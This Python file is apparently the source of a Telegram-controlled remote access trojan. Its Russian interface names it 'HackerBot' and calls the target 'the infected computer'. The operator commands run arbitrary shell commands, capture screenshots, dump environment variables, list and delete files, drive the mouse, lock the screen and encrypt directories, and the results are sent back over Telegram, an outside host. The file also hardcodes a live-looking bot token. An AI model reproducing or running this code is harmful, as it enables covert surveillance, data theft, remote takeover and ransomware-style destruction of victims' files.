############	Imports    ############
import os
import time
import crypt
import telebot
import getScreen
import pyautogui
import webbrowser as wb

############	Imports    ############


############	Bot variables    ############
token = '1473649766:AAFxGvU6-NUPncUK3O6YODagaqWors_p8K4'
bot = telebot.TeleBot(token)
############	Bot variables    ############


############	Variables    ############
onlyCode = 1
length = 0
filesNames = ""


############	Variables    ############


############    Functions   ############
def extract_arg(arg):
    return arg.split()[1:]


############    Functions   #############


############    Bot start command    ############
@bot.message_handler(commands=['start'])
def start_message(message):
    bot.send_message(message.chat.id, "Добро пожаловать в HackerBot")
    bot.send_message(message.chat.id,
                     "Ознакомьтесь с командами: \n" +
                     "	 1) /getDiscs - получить все диски \n \n" +
                     "	 2) /getSystemDisk - диск на котором находиться система \n \n" +
                     "   3) /getFileNames - получить все папки и файлы в директории, директорию указывать через пробел пример: D:\Program Files\Anubis \n \n"
                     "	 4) /getScreen - получить скриншот \n \n" +
                     "   5) /getCompInfo - получить информацию о системе \n \n" +
                     "   6) /deleteFile - удалить файл через пробел указать путь до файла \n \n" +
                     "   7) /executeCommand - выполнить команду в cmd.exe не требующую дополнительного ввода \n \n" +
                     "   8) /getSizes - получить размеры монитора \n \n" +
                     "   9) /moveCursorTo - переместить курсор в точку на мониторе не кликая, после команды через пробел введите координаты x и y \n \n" +
                     "   10) /clickCursorIn - кликнуть курсором в точке на экране, после команды через пробел введите координаты x и y \n \n" +
                     "	11) /lock - заблокировать компьютер \n \n" +
                     "   12) /openUrl - открыть сайт, через пробел указать нужный сайт \n \n" +
                     "   13) /getFullPath - получить полный путь до папки с вирусом \n \n" +
                     "   14) /cryptDir - зашифровать директорию(желательно не шифровать директорию с вирусом, можно потерять соединение), через пробел указать корневую директорию \n \n" +
                     "	15) /exit - остановить бота")


############    Bot start command    ############


############    Bot get system disk command    ############
@bot.message_handler(commands=['getSystemDisk'])
def systemdisck_command(message):
    bot.send_message(message.chat.id, 'Диск на котором находиться система: "{}"'.format(os.getenv("SystemDrive")))


############    Bot get system disk command    ############


############    Bot get files names command    ############
@bot.message_handler(commands=['getFileNames'])
def fileNames_command(message):
    path = extract_arg(message.text)
    print(path)
    global length, filesNames
    for root, dirs, files in os.walk(path[0]):
        filesNames += "\n \n"
        filesNames += "################################### \n"
        filesNames += root + "\n"
        for _dir in dirs:
            filesNames += str(_dir) + "\n"

        for _file in files:
            filesNames += str(_file) + "\n"
        length += 1
        filesNames += "\n \n"
        filesNames += "################################### \n"
        try:
            try:
                bot.send_message(message.chat.id, str(filesNames))
            except:
                time.sleep(10)
                bot.send_message(message.chat.id, str(filesNames))
        except:
            time.sleep(142)
            bot.send_message(message.chat.id, "Слишком большая папка")
        filesNames = ""


############    Bot get files names command    ############


############    Bot screenshoot command    ############
@bot.message_handler(commands=['getScreen'])
def screen_command(message):
    getScreen.screenshoot()
    bot.send_photo(message.chat.id, open(os.path.abspath('screen.png'), 'rb'))
    os.remove(os.path.abspath('screen.png'))


############    Bot screenshoot command    ############


############    Bot get comp information command    ############
@bot.message_handler(commands=['getCompInfo'])
def osName_command(message):
    value = str(os.environ)
    bot.send_message(message.chat.id, value)


############    Bot get comp information command    ############


############    Bot delete file command    ############
@bot.message_handler(commands=['deleteFile'])
def deleteFile_command(message):
    path = extract_arg(message.text)
    print(path)
    try:
        os.remove(path[0])
        bot.send_message(message.chat.id, "Файл удалён")
    except Exception as e:
        bot.send_message(message.chat.id, "Ошибка: {}".format(e))


############    Bot delete file command    ############


############    Bot execute command    ############
@bot.message_handler(commands=['executeCommand'])
def execute_command(message):
    resultText = extract_arg(message.text)
    commandText = [" ".join(resultText)]
    try:
        bot.send_message(message.chat.id, os.popen(commandText[0]).read())
    except Exception as e:
        bot.send_message(message.chat.id, e)


############    Bot execute command    ############


############    Bot get sizes command    ############
@bot.message_handler(commands=['getSizes'])
def getSizes_command(message):
    size_x, size_y = pyautogui.size()
    bot.send_message(message.chat.id, "Width: {}    Height: {}".format(size_x, size_y))


############    Bot get sizes command    ############


############    Bot move cursor command    ############
@bot.message_handler(commands=["moveCursorTo"])
def moveTo_command(message):
    try:
        x_coords, y_coords = extract_arg(message.text)[0], extract_arg(message.text)[1]
        try:
            pyautogui.moveTo(int(x_coords), int(y_coords))
            bot.send_message(message.chat.id, "Курсор переведён в точку {} {}".format(x_coords, y_coords))
        except Exception as e:
            bot.send_message(message.chat.id, str(e))
    except:
        bot.send_message(message.chat.id, "Введите обе координаты через пробел")


############    Bot move cursor command    ############


############    Bot click cursor command    ############
@bot.message_handler(commands=["clickCursorIn"])
def moveTo_command(message):
    try:
        x_coords, y_coords = extract_arg(message.text)[0], extract_arg(message.text)[1]
        try:
            pyautogui.click(int(x_coords), int(y_coords))
            bot.send_message(message.chat.id, "Курсор кликнул в точке {} {}".format(x_coords, y_coords))
        except Exception as e:
            bot.send_message(message.chat.id, str(e))
    except:
        bot.send_message(message.chat.id, "Введите обе координаты через пробел")


############    Bot click cursor command    ############


############    Bot lock command    ############
@bot.message_handler(commands=['lock'])
def exit_command(message):
    bot.send_message(message.chat.id, "Заражённый компьютер заблокирован")
    import locker
    bot.send_message(message.chat.id, "Компьютер разблокирован")


############    Bot lock command    ############


############    Bot open url command    ############
@bot.message_handler(commands=['openUrl'])
def openUrl_command(message):
    try:
        wb.open_new_tab(str(extract_arg(message.text)[0]))
        bot.send_message(message.chat.id, "Ссылка открыта")
    except Exception as e:
        bot.send_message(message.chat.id, str(e))


############    Bot open url command    ############


############    Bot crypt files command    ############
@bot.message_handler(commands=['cryptDir'])
def cryptFiles_command(message):
    path = str(extract_arg(message.text)[0])
    bot.send_message(message.chat.id, crypt.initialisation(path))


############    Bot crypt files command    ############


############    Bot exit command    ############
@bot.message_handler(commands=['exit'])
def exit_command(message):
    bot.send_message(message.chat.id, "Бот остановил свою работу")
    bot.stop_polling()


############    Bot exit command    ############
try:
    bot.polling()
except:
    pass
############    Bot loop command    ############
